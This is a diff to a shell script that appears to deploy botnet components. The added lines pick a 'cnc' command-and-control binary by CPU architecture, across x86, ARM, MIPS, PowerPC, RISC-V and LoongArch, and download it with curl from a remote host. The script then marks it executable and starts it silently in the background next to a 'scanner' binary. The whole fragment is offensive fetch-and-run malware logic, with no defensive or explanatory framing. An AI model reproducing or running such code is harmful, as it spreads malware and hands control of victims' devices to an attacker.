@@ -59,6 +59,36 @@ fi
 while [ ! -f scanner ]; do
     sleep 1
 done
+if echo "$arch" | grep -qiE 'x86_64|amd64'; then
+    curl "http://$ip/amd64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'i386|386'; then
+    curl "http://$ip/386_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'armv8|arm64|aarch64'; then
+    curl "http://$ip/arm64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'arm'; then
+    curl "http://$ip/arm_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips64le'; then 
+    curl "http://$ip/mips64le_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips64'; then 
+    curl "http://$ip/mip64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'mips'; then
+    curl "http://$ip/mips_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'loong64'; then
+    curl "http://$ip/loong64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'ppc64le'; then
+    curl "http://$ip/ppc64le_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'ppc64'; then
+    curl "http://$ip/ppc64_cnc" -o cnc
+elif echo "$arch" | grep -qiE 'riscv64'; then
+    curl "http://$ip/riscv64_cnc" -o cnc
+else
+    exit
+fi
+while [ ! -f cnc ]; do
+    sleep 1
+done
 chmod +x scanner
 chmod +x loader
-nohup ./scanner > /dev/null 2>&1 &
+chmod +x cnc
+./scanner > /dev/null 2>&1 &
+./cnc  > /dev/null 2>&1 &
